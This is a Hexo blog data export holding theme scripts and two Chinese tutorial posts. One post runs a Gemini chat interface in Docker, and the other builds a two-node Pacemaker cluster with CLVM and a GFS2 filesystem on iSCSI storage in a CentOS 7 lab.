</meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>之前利用 Docker 搭建了本地了 ChatGPT，具体的搭建步骤可以查看<a href=\"https://nustarain.gitee.io/2023/09/12/LocalchatGPT/\"><strong>利用docker搭建本地的chatGPT</strong></a>。</p>\n<p>这次利用 Docker 来搭建 Google 公司推出的 Gemini 聊天机器人。</p>\n<h3 id=\"搭建步骤\"><a href=\"#搭建步骤\" class=\"headerlink\" title=\"搭建步骤\"></a>搭建步骤</h3><ol>\n<li>使用 Google 账号注册 Gemini，<a href=\"https://deepmind.google/technologies/gemini/#introduction\"><strong>Gemini官网地址</strong></a>。</li>\n</ol>","more":"<ol start=\"2\">\n<li>跳转到<a href=\"https://ai.google.dev/\"><strong>这个页面</strong></a> 准备进行 API 的获取。</li>\n</ol>\n<p><img src=\"/2023/12/20/gemini/1.png\" alt=\"gemini\"></p>\n<ol start=\"3\">\n<li>进入这个页面后获取 API，到此，最复杂的就完事了。</li>\n</ol>\n<p><img src=\"/2023/12/20/gemini/2.png\" alt=\"gemini\"></p>\n<ol start=\"4\">\n<li>拉取镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull howie6879/geminiprochat:v0.1.0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>运行容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name geminiprochat \\</span><br><span class=\"line\">--restart always \\</span><br><span class=\"line\">-p 3030:3000 \\</span><br><span class=\"line\">-itd \\</span><br><span class=\"line\">-e GEMINI_API_KEY=xxx \\</span><br><span class=\"line\">howie6879/geminiprochat:v0.1.0</span><br></pre></td></tr></table></figure>\n\n<p>GEMINI_API_KEY&#x3D;xxx 把“xxx”换成自己的 API 就 OK 了。端口的话也可以根据喜好修改。</p>\n<ol start=\"6\">\n<li>打开浏览器访问，效果如下</li>\n</ol>\n<p><img src=\"/2023/12/20/gemini/3.png\" alt=\"gemini\"></p>\n<h3 id=\"优劣对比\"><a href=\"#优劣对比\" class=\"headerlink\" title=\"优劣对比\"></a>优劣对比</h3><p>ChatGPT 本地搭建需要一段时间就重新获取一下 token 值，但是 Gemini 不需要重复获取 token 值。</p>\n<p>ChatGPT 可以同时创建很多会话，但是 Gemini 只能有一个会话。</p>\n<p>ChatGPT 不能联网，Gemini 是联网的，但是数据只到2023年3月。</p>"},{"title":"Linux关于iscsi+pacemaker+CLVM+gfs的实现","date":"2023-07-04T23:55:37.000Z","_content":"\n### 基本信息\n\n|主机名|身份|网络接口|连接模式|IP地址|\n|:-:|:-:|:-:|:-:|:-:|\n|web3|web服务器|ens224|仅主机|10.8.7.82/24|\n|web4|web服务器|ens224|仅主机|10.8.7.83/24|\n|storage1|iscsi存储服务器|ens224|仅主机|10.8.7.41/24|\n|storage2|iscsi存储服务器|ens224|仅主机|10.8.7.42/24|\n\n### 项目说明\n\n在本项目中，主要完成以下任务：\n\n1. 完成gfs1和gfs2关于ISCSI存储服务器的搭建，并且成功挂载到web1和web2主机。\n\n<!-- more -->\n\n2. 建立web1和web2主机的集群关系。\n\n3. 挂载GFS文件系统。\n\n4. 配置集群资源。\n\n5. 创建CLVM。\n\n6. 挂载共享存储。\n\n### 准备环境\n\n* Centos7版本的虚拟机，Centos8版本的没有找到资料，还在自我探索的过程中。等待后期的更新吧。\n\n* 虚拟机关闭SELINUX。\n\n* 虚拟机关闭防火墙。\n\n* 虚拟机关闭NetworkManager。\n\n* 编写`/etc/hosts`文件，这个可选，我是为了后期配置方便，才写这样一个文件。\n\n```bash\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n10.8.7.82   web3.liuxp.com\n10.8.7.83   web4.liuxp.com\n10.8.7.41   storage1.liuxp.com\n10.8.7.42   storage2.liuxp.com\n```\n\n如果你也打算用这个，编辑完之后可以使用scp命令直接拷贝到别的主机。\n\n```bash\nscp /etc/hosts 10.8.7.42:/etc/\n```\n\n### 项目实施\n\n* 一定要按照顺序来做。\n\n* 关于ISCSI服务器创建和挂载到客户端的操作，具体搭建过程可以看[搭建并挂载ISCSI存储服务器](https://nustarain.gitee.io/2023/07/04/ISCSI/)这篇文章，本文章不在赘述。对于我这个项目，两台ISCSI存储器都各自提供了一块磁盘，并且在两台web服务器都实现了挂载，storage1提供的ISCSI存储映射到web服务器上是`/dev/sdb`，storage2提供的ISCSI存储映射到web服务器上是`/dev/sdc`。\n\n* 我接下来讲的“两台虚拟机”是指web3和web4，“任意一台虚拟机”是指web3或者web4其中的任意一台。\n\n* 下载软件，两台虚拟机都需要做的\n\n```bash\nyum -y install pacemaker pcs\nsystemctl start pcsd\nsystemctl enable pcsd\necho \"q\" | passwd --stdin hacluster\n```\n\n这块的意思是下载了pcsd服务，开启并设置自启动，安装这个服务会再系统创建一个`hacluster`用户，后面要用，要先给他改个密码。\n\n* 集群建立免认证，在集群任意一台机器做就可以\n\n说白一点，就是web3生成公钥私钥，然后把公钥发给web4，或者web4生成公钥私钥，然后把公钥发给web3。\n\n```bash\nssh-keygen\nssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com\n```\n\n上面的命令是以web3举的例子。\n\n* 搭建集群，两台虚拟机都需要做的\n\n```bash 折叠代码\npcs cluster auth web3.liuxp.com web4.liuxp.com\nUsername: hacluster\nPassword:q\nnode3: Authorized\nnode4: Authorized\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force # 如果报错就强制执行进行覆盖\npcs cluster start\npcs cluster status\npcs cluster enable --all\npcs status corosync\n```\n\n一般情况下如果第一次创建集群，上面命令可以直接创建成功，如果不是第一次创建，就需要加`--force`选项强制覆盖。等到所有信息都success，下面的集群开启，查看状态，设置自启动都不会出现什么问题的。\n\n如果第一次集群出现了什么问题，打算重新做，可以通过下面的这个命令摧毁集群，然后再强制建立集群。\n\n```bash\npcs cluster destroy\n```\n\n* 挂载GFS文件系统，两台虚拟机都需要做的\n\n```bash\nyum install -y lvm2-cluster gfs2-utils fence-agents-all\nlvmconf --enable-cluster\nmodprobe gfs2\nlsmod | grep gfs2 \n```\n\n在进行完最后一步之后，如果出现一些看不懂的内容就说明，GFS文件系统已经挂载到这个系统上了，可以使用它进行格式化磁盘了。\n\n* 配置集群资源，在集群任意一台机器做就可以\n\n```bash\npcs property set no-quorum-policy=ignore\npcs property set stonith-enabled=false\n\npcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=true op monitor interval=30s clone interleave=true ordered=true\n\npcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s clone interleave=true ordered=true\n\npcs constraint order start dlm-clone then clvmd-clone\npcs constraint colocation add clvmd-clone with dlm-clone\npcs property set no-quorum-policy=freeze\n```\n\n这块是没有个性化的，可以直接无脑<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>\n\n* 创建CLVM，在集群任意一台机器做就可以\n\n```bash\npvcreate /dev/sdb\npvcreate /dev/sdc\nvgcreate -cy qavg /dev/sdb /dev/sdc\nlvcreate -L 12G -n qa qavg\n```\n\n这里命令的具体含义如果不懂，可以看我的[关于LVM的配置](https://nustarain.gitee.io/2023/07/04/LVM/)的文章。\n\n* 挂载实现共享存储\n\n```bash 折叠代码\n# 格式化文件系统，在集群任意一台机器做就可以\nmkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa\n# 创建挂载点，两台虚拟机都需要做的\nmkdir /mnt/cluster\n# 要实现自动挂载，在集群任意一台机器做就可以\npcs resource create fs_gfs2 Filesystem device=\"/dev/qavg/qa\" directory=\"/mnt/cluster\" fstype=\"gfs2\" options=\"noatime,nodiratime\" op monitor interval=10s clone interleave=true\n\n# 给集群资源设置启动顺序\npcs constraint order start clvmd-clone then fs_gfs2-clone\npcs constraint colocation add fs_gfs2-clone with clvmd-clone\npcs constraint show\ndf\n```\n\n最后`df`如果看到自己创建的逻辑卷`/dev/qavg/qa`，就说明挂载成功了，可以通过向挂载点里面写入文件来使用存储了。","source":"_posts/gfs.md","raw":"---\ntitle: Linux关于iscsi+pacemaker+CLVM+gfs的实现\ndate: 2023-07-05 07:55:37\ncategories: 技术\ntags:\n  - Linux\n---\n\n### 基本信息\n\n|主机名|身份|网络接口|连接模式|IP地址|\n|:-:|:-:|:-:|:-:|:-:|\n|web3|web服务器|ens224|仅主机|10.8.7.82/24|\n|web4|web服务器|ens224|仅主机|10.8.7.83/24|\n|storage1|iscsi存储服务器|ens224|仅主机|10.8.7.41/24|\n|storage2|iscsi存储服务器|ens224|仅主机|10.8.7.42/24|\n\n### 项目说明\n\n在本项目中，主要完成以下任务：\n\n1. 完成gfs1和gfs2关于ISCSI存储服务器的搭建，并且成功挂载到web1和web2主机。\n\n<!-- more -->\n\n2. 建立web1和web2主机的集群关系。\n\n3. 挂载GFS文件系统。\n\n4. 配置集群资源。\n\n5. 创建CLVM。\n\n6. 挂载共享存储。\n\n### 准备环境\n\n* Centos7版本的虚拟机，Centos8版本的没有找到资料，还在自我探索的过程中。等待后期的更新吧。\n\n* 虚拟机关闭SELINUX。\n\n* 虚拟机关闭防火墙。\n\n* 虚拟机关闭NetworkManager。\n\n* 编写`/etc/hosts`文件，这个可选，我是为了后期配置方便，才写这样一个文件。\n\n```bash\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n10.8.7.82   web3.liuxp.com\n10.8.7.83   web4.liuxp.com\n10.8.7.41   storage1.liuxp.com\n10.8.7.42   storage2.liuxp.com\n```\n\n如果你也打算用这个，编辑完之后可以使用scp命令直接拷贝到别的主机。\n\n```bash\nscp /etc/hosts 10.8.7.42:/etc/\n```\n\n### 项目实施\n\n* 一定要按照顺序来做。\n\n* 关于ISCSI服务器创建和挂载到客户端的操作，具体搭建过程可以看[搭建并挂载ISCSI存储服务器](https://nustarain.gitee.io/2023/07/04/ISCSI/)这篇文章，本文章不在赘述。对于我这个项目，两台ISCSI存储器都各自提供了一块磁盘，并且在两台web服务器都实现了挂载，storage1提供的ISCSI存储映射到web服务器上是`/dev/sdb`，storage2提供的ISCSI存储映射到web服务器上是`/dev/sdc`。\n\n* 我接下来讲的“两台虚拟机”是指web3和web4，“任意一台虚拟机”是指web3或者web4其中的任意一台。\n\n* 下载软件，两台虚拟机都需要做的\n\n```bash\nyum -y install pacemaker pcs\nsystemctl start pcsd\nsystemctl enable pcsd\necho \"q\" | passwd --stdin hacluster\n```\n\n这块的意思是下载了pcsd服务，开启并设置自启动，安装这个服务会再系统创建一个`hacluster`用户，后面要用，要先给他改个密码。\n\n* 集群建立免认证，在集群任意一台机器做就可以\n\n说白一点，就是web3生成公钥私钥，然后把公钥发给web4，或者web4生成公钥私钥，然后把公钥发给web3。\n\n```bash\nssh-keygen\nssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com\n```\n\n上面的命令是以web3举的例子。\n\n* 搭建集群，两台虚拟机都需要做的\n\n```bash 折叠代码\npcs cluster auth web3.liuxp.com web4.liuxp.com\nUsername: hacluster\nPassword:q\nnode3: Authorized\nnode4: Authorized\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com\npcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force # 如果报错就强制执行进行覆盖\npcs cluster start\npcs cluster status\npcs cluster enable --all\npcs status corosync\n```\n\n一般情况下如果第一次创建集群，上面命令可以直接创建成功，如果不是第一次创建，就需要加`--force`选项强制覆盖。等到所有信息都success，下面的集群开启，查看状态，设置自启动都不会出现什么问题的。\n\n如果第一次集群出现了什么问题，打算重新做，可以通过下面的这个命令摧毁集群，然后再强制建立集群。\n\n```bash\npcs cluster destroy\n```\n\n* 挂载GFS文件系统，两台虚拟机都需要做的\n\n```bash\nyum install -y lvm2-cluster gfs2-utils fence-agents-all\nlvmconf --enable-cluster\nmodprobe gfs2\nlsmod | grep gfs2 \n```\n\n在进行完最后一步之后，如果出现一些看不懂的内容就说明，GFS文件系统已经挂载到这个系统上了，可以使用它进行格式化磁盘了。\n\n* 配置集群资源，在集群任意一台机器做就可以\n\n```bash\npcs property set no-quorum-policy=ignore\npcs property set stonith-enabled=false\n\npcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=true op monitor interval=30s clone interleave=true ordered=true\n\npcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s clone interleave=true ordered=true\n\npcs constraint order start dlm-clone then clvmd-clone\npcs constraint colocation add clvmd-clone with dlm-clone\npcs property set no-quorum-policy=freeze\n```\n\n这块是没有个性化的，可以直接无脑<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>\n\n* 创建CLVM，在集群任意一台机器做就可以\n\n```bash\npvcreate /dev/sdb\npvcreate /dev/sdc\nvgcreate -cy qavg /dev/sdb /dev/sdc\nlvcreate -L 12G -n qa qavg\n```\n\n这里命令的具体含义如果不懂，可以看我的[关于LVM的配置](https://nustarain.gitee.io/2023/07/04/LVM/)的文章。\n\n* 挂载实现共享存储\n\n```bash 折叠代码\n# 格式化文件系统，在集群任意一台机器做就可以\nmkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa\n# 创建挂载点，两台虚拟机都需要做的\nmkdir /mnt/cluster\n# 要实现自动挂载，在集群任意一台机器做就可以\npcs resource create fs_gfs2 Filesystem device=\"/dev/qavg/qa\" directory=\"/mnt/cluster\" fstype=\"gfs2\" options=\"noatime,nodiratime\" op monitor interval=10s clone interleave=true\n\n# 给集群资源设置启动顺序\npcs constraint order start clvmd-clone then fs_gfs2-clone\npcs constraint colocation add fs_gfs2-clone with clvmd-clone\npcs constraint show\ndf\n```\n\n最后`df`如果看到自己创建的逻辑卷`/dev/qavg/qa`，就说明挂载成功了，可以通过向挂载点里面写入文件来使用存储了。","slug":"gfs","published":1,"updated":"2024-05-03T03:55:54.853Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fl005m7zj36rdraegz","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h3><table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP地址</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">web3</td>\n<td align=\"center\">web服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.82&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">web4</td>\n<td align=\"center\">web服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.83&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">storage1</td>\n<td align=\"center\">iscsi存储服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.41&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">storage2</td>\n<td align=\"center\">iscsi存储服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.42&#x2F;24</td>\n</tr>\n</tbody></table>\n<h3 id=\"项目说明\"><a href=\"#项目说明\" class=\"headerlink\" title=\"项目说明\"></a>项目说明</h3><p>在本项目中，主要完成以下任务：</p>\n<ol>\n<li>完成gfs1和gfs2关于ISCSI存储服务器的搭建，并且成功挂载到web1和web2主机。</li>\n</ol>\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li><p>建立web1和web2主机的集群关系。</p>\n</li>\n<li><p>挂载GFS文件系统。</p>\n</li>\n<li><p>配置集群资源。</p>\n</li>\n<li><p>创建CLVM。</p>\n</li>\n<li><p>挂载共享存储。</p>\n</li>\n</ol>\n<h3 id=\"准备环境\"><a href=\"#准备环境\" class=\"headerlink\" title=\"准备环境\"></a>准备环境</h3><ul>\n<li><p>Centos7版本的虚拟机，Centos8版本的没有找到资料，还在自我探索的过程中。等待后期的更新吧。</p>\n</li>\n<li><p>虚拟机关闭SELINUX。</p>\n</li>\n<li><p>虚拟机关闭防火墙。</p>\n</li>\n<li><p>虚拟机关闭NetworkManager。</p>\n</li>\n<li><p>编写<code>/etc/hosts</code>文件，这个可选，我是为了后期配置方便，才写这样一个文件。</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class=\"line\">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class=\"line\">10.8.7.82   web3.liuxp.com</span><br><span class=\"line\">10.8.7.83   web4.liuxp.com</span><br><span class=\"line\">10.8.7.41   storage1.liuxp.com</span><br><span class=\"line\">10.8.7.42   storage2.liuxp.com</span><br></pre></td></tr></table></figure>\n\n<p>如果你也打算用这个，编辑完之后可以使用scp命令直接拷贝到别的主机。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp /etc/hosts 10.8.7.42:/etc/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"项目实施\"><a href=\"#项目实施\" class=\"headerlink\" title=\"项目实施\"></a>项目实施</h3><ul>\n<li><p>一定要按照顺序来做。</p>\n</li>\n<li><p>关于ISCSI服务器创建和挂载到客户端的操作，具体搭建过程可以看<a href=\"https://nustarain.gitee.io/2023/07/04/ISCSI/\">搭建并挂载ISCSI存储服务器</a>这篇文章，本文章不在赘述。对于我这个项目，两台ISCSI存储器都各自提供了一块磁盘，并且在两台web服务器都实现了挂载，storage1提供的ISCSI存储映射到web服务器上是<code>/dev/sdb</code>，storage2提供的ISCSI存储映射到web服务器上是<code>/dev/sdc</code>。</p>\n</li>\n<li><p>我接下来讲的“两台虚拟机”是指web3和web4，“任意一台虚拟机”是指web3或者web4其中的任意一台。</p>\n</li>\n<li><p>下载软件，两台虚拟机都需要做的</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum -y install pacemaker pcs</span><br><span class=\"line\">systemctl start pcsd</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> pcsd</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;q&quot;</span> | passwd --stdin hacluster</span><br></pre></td></tr></table></figure>\n\n<p>这块的意思是下载了pcsd服务，开启并设置自启动，安装这个服务会再系统创建一个<code>hacluster</code>用户，后面要用，要先给他改个密码。</p>\n<ul>\n<li>集群建立免认证，在集群任意一台机器做就可以</li>\n</ul>\n<p>说白一点，就是web3生成公钥私钥，然后把公钥发给web4，或者web4生成公钥私钥，然后把公钥发给web3。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen</span><br><span class=\"line\">ssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com</span><br></pre></td></tr></table></figure>\n\n<p>上面的命令是以web3举的例子。</p>\n<ul>\n<li>搭建集群，两台虚拟机都需要做的</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcs cluster auth web3.liuxp.com web4.liuxp.com</span><br><span class=\"line\">Username: hacluster</span><br><span class=\"line\">Password:q</span><br><span class=\"line\">node3: Authorized</span><br><span class=\"line\">node4: Authorized</span><br><span class=\"line\">pcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com</span><br><span class=\"line\">pcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force <span class=\"comment\"># 如果报错就强制执行进行覆盖</span></span><br><span class=\"line\">pcs cluster start</span><br><span class=\"line\">pcs cluster status</span><br><span class=\"line\">pcs cluster <span class=\"built_in\">enable</span> --all</span><br><span class=\"line\">pcs status corosync</span><br></pre></td></tr></table></figure>\n\n<p>一般情况下如果第一次创建集群，上面命令可以直接创建成功，如果不是第一次创建，就需要加<code>--force</code>选项强制覆盖。等到所有信息都success，下面的集群开启，查看状态，设置自启动都不会出现什么问题的。</p>\n<p>如果第一次集群出现了什么问题，打算重新做，可以通过下面的这个命令摧毁集群，然后再强制建立集群。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcs cluster destroy</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>挂载GFS文件系统，两台虚拟机都需要做的</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y lvm2-cluster gfs2-utils fence-agents-all</span><br><span class=\"line\">lvmconf --enable-cluster</span><br><span class=\"line\">modprobe gfs2</span><br><span class=\"line\">lsmod | grep gfs2 </span><br></pre></td></tr></table></figure>\n\n<p>在进行完最后一步之后，如果出现一些看不懂的内容就说明，GFS文件系统已经挂载到这个系统上了，可以使用它进行格式化磁盘了。</p>\n<ul>\n<li>配置集群资源，在集群任意一台机器做就可以</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcs property <span class=\"built_in\">set</span> no-quorum-policy=ignore</span><br><span class=\"line\">pcs property <span class=\"built_in\">set</span> stonith-enabled=<span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">pcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=<span class=\"literal\">true</span> op monitor interval=30s <span class=\"built_in\">clone</span> interleave=<span class=\"literal\">true</span> ordered=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">pcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s <span class=\"built_in\">clone</span> interleave=<span class=\"literal\">true</span> ordered=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">pcs constraint order start dlm-clone <span class=\"keyword\">then</span> clvmd-clone</span><br><span class=\"line\">pcs constraint colocation add clvmd-clone with dlm-clone</span><br><span class=\"line\">pcs property <span class=\"built_in\">set</span> no-quorum-policy=freeze</span><br></pre></td></tr></table></figure>\n\n<p>这块是没有个性化的，可以直接无脑<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd></p>\n<ul>\n<li>创建CLVM，在集群任意一台机器做就可以</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvcreate /dev/sdb</span><br><span class=\"line\">pvcreate /dev/sdc</span><br><span class=\"line\">vgcreate -cy qavg /dev/sdb /dev/sdc</span><br><span class=\"line\">lvcreate -L 12G -n qa qavg</span><br></pre></td></tr></table></figure>\n\n<p>这里命令的具体含义如果不懂，可以看我的<a href=\"https://nustarain.gitee.io/2023/07/04/LVM/\">关于LVM的配置</a>的文章。</p>\n<ul>\n<li>挂载实现共享存储</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 格式化文件系统，在集群任意一台机器做就可以</span></span><br><span class=\"line\">mkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa</span><br><span class=\"line\"><span class=\"comment\"># 创建挂载点，两台虚拟机都需要做的</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /mnt/cluster</span><br><span class=\"line\"><span class=\"comment\"># 要实现自动挂载，在集群任意一台机器做就可以</span></span><br><span class=\"line\">pcs resource create fs_gfs2 Filesystem device=<span class=\"string\">&quot;/dev/qavg/qa&quot;</span> directory=<span class=\"string\">&quot;/mnt/cluster&quot;</span> fstype=<span class=\"string\">&quot;gfs2&quot;</span> options=<span class=\"string\">&quot;noatime,nodiratime&quot;</span> op monitor interval=10s <span class=\"built_in\">clone</span> interleave=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 给集群资源设置启动顺序</span></span><br><span class=\"line\">pcs constraint order start clvmd-clone <span class=\"keyword\">then</span> fs_gfs2-clone</span><br><span class=\"line\">pcs constraint colocation add fs_gfs2-clone with clvmd-clone</span><br><span class=\"line\">pcs constraint show</span><br><span class=\"line\"><span class=\"built_in\">df</span></span><br></pre></td></tr></table></figure>\n\n<p>最后<code>df</code>如果看到自己创建的逻辑卷<code>/dev/qavg/qa</code>，就说明挂载成功了，可以通过向挂载点里面写入文件来使用存储了。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script 